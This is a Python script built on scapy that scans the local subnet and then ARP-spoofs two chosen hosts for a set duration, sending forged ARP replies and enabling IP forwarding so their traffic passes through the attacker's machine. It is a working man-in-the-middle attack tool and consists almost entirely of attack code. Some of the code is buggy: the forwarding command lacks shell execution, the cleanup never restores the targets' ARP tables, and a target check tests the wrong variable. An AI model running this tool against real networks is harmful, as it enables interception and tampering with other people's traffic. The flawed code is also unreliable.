import scapy.all as scyp

import ipaddress
import sys


def scan(ip_address):
    arp_packet = scyp.ARP(pdst=ip_address)
    broadcast_packet = scyp.Ether(dst="ff:ff:ff:ff:ff:ff")
    sending_packet = broadcast_packet/arp_packet
    answer_list = scyp.srp(sending_packet,timeout=1 ,iface="eth0")[0]
    answer_dict={}
    for el in answer_list:
        answer_dict[el.answer.psrc] = el.answer.hwsrc 
    return answer_dict

def printoutput(answer_dict):

    print("\n" + "="*45)
    print("{:^45}".format("Scan Results"))
    print("="*45)
    print("{:<20} {:<20}".format("IP Address", "MAC Address"))
    print("-" * 45)
    
    for ip, mac in answer_dict.items():
        print("{:<20} {:<20}".format(ip, mac))
    
    print("="*45)



def verify_ip(ip):
     
    try:
        ip_verified =ipaddress.ip_network(ip , strict=True)
        return str(ip_verified)
    except:
        print("[-] invalid ip address ")
        sys.exit()
    


def option_fucn():
    options_Dict = {"duration":"60","target1":None,"target2":None}
            
    ip = scyp.get_if_addr(iff=scyp.conf.iface)
    ip_split = ip.split(".")
    ip_split[3]="0/24"
    ip_rejoin = ".".join(ip_split)
    

    output =scan(ip_rejoin)


    import argparse
    parser= argparse.ArgumentParser()
    parser.add_argument("-s","--scan",dest="scan" ,action="store_true" ,help="show/scan connected devices" )
    parser.add_argument('-t1','--target1' ,dest="target1" , help="set the target 1")
    parser.add_argument('-t2', '--target2' ,dest="target2" ,help="set the target 2")
    parser.add_argument('-d','--duration' ,dest="duration" ,default="60",help="set the duration to running in minutes (forver = 999999)")

    options = parser.parse_args()

    if options.scan:
        printoutput(output)

    if options.target1:
        if options.target1 in output.keys():
            print("target1 detected ----------------")
            options_Dict["target1"] = options.target1
        else:
            print("[-] target 1 is not detected")

    
    
    if options.target1:
        if options.target2 in output.keys():
            print("target2 detected ----------------")
            options_Dict["target2"] = options.target2
        else:
            print("[-] target 1 is not detected")
   
    
    if options.duration.isdigit() and int(options.duration )> 0:
        options_Dict["duration"] = options.duration
    else:
        print("[-] set valid duration")

    for key,val in options_Dict.items():
        print(f"{key} \t {val}") 

    return options_Dict    

def arpspoof(dict1):

    mac_own_machine = scyp.get_if_hwaddr(scyp.conf.iface)


    packet_send_to_target1 = scyp.ARP(op=2,pdst=dict1["target1"] ,hwsrc =mac_own_machine,psrc=dict1["target2"])
    packet_send_to_target2 =scyp.ARP(op=2,pdst = dict1["target2"],hwsrc=mac_own_machine ,psrc =dict1["target1"])

    import subprocess

    print("Starting port forwarding")
    print(" ")

    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward")


    import time 
    count =0
    start = time.time()


    try:
        while time.time() - start < int(dict1["duration"])*60:
            scyp.send(packet_send_to_target1 ,verbose =False)
            scyp.send(packet_send_to_target2 , verbose = False)
            count= count+1
            print(f"\rsending packet to {dict1["target1"]} : {count} packet" ,end="")
            print(f"\rsending packet to {dict1["target2"]} : {count} packet" ,end="")


            time.sleep(1)
        print("Time completed")
    except KeyboardInterrupt :
        print("CTRL + C detected Exiting the program")
    
    finally:
            print("Starting port forwarding")
            print(" ")

            subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward")




if __name__ == "__main__":
    dict1 = option_fucn()
    if dict1["target1"]!=None and dict1["target2"]!=None:
        arpspoof(dict1) 


